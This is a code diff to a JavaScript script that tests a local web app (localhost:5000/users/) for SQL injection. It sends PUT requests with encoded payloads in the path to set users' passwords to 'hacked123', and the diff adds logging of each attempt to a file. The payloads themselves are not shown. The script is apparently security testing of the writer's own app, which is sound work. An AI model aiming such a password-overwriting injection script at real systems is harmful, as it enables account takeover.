@@ -1,4 +1,6 @@
 import axios from 'axios';
+import fs from 'fs';
+import path from 'path';
 
 // Target base URL
 const baseURL = 'http://localhost:5000/users/';
@@ -13,12 +15,24 @@ const payloads = [
 // The new password you want to inject
 const newPassword = 'hacked123';
 
+// Log file path
+const logPath = path.resolve('./injection-test.log');
+
+function logToFile(message) {
+  const timestamp = new Date().toISOString();
+  const fullMessage = `[${timestamp}] ${message}\n`;
+  fs.appendFileSync(logPath, fullMessage);
+}
+
 async function testSqlInjection() {
   for (const payload of payloads) {
     const encodedPayload = encodeURIComponent(payload);
     const targetURL = baseURL + encodedPayload;
 
-    console.log(`\nTesting payload: ${payload}`);
+    const header = `\n---\nTesting payload: ${payload}`;
+    console.log(header);
+    logToFile(header);
+
     try {
       const response = await axios.put(targetURL, {
         newPass: newPassword
@@ -28,18 +42,22 @@ async function testSqlInjection() {
         }
       });
 
-      console.log(`Status Code: ${response.status}`);
-      console.log(`Response Body:\n${JSON.stringify(response.data, null, 2)}`);
+      const successLog = `Status Code: ${response.status}\nResponse Body: ${JSON.stringify(response.data, null, 2)}`;
+      console.log(successLog);
+      logToFile(successLog);
+
     } catch (error) {
       if (error.response) {
-        console.error(`Status Code: ${error.response.status}`);
-        console.error(`Response Body:\n${JSON.stringify(error.response.data, null, 2)}`);
+        const errorLog = `Status Code: ${error.response.status}\nResponse Body: ${JSON.stringify(error.response.data, null, 2)}`;
+        console.error(errorLog);
+        logToFile(errorLog);
       } else {
-        console.error(`Request failed: ${error.message}`);
+        const failLog = `Request failed: ${error.message}`;
+        console.error(failLog);
+        logToFile(failLog);
       }
     }
   }
 }
 
-// 👇 This was likely missing
 testSqlInjection();
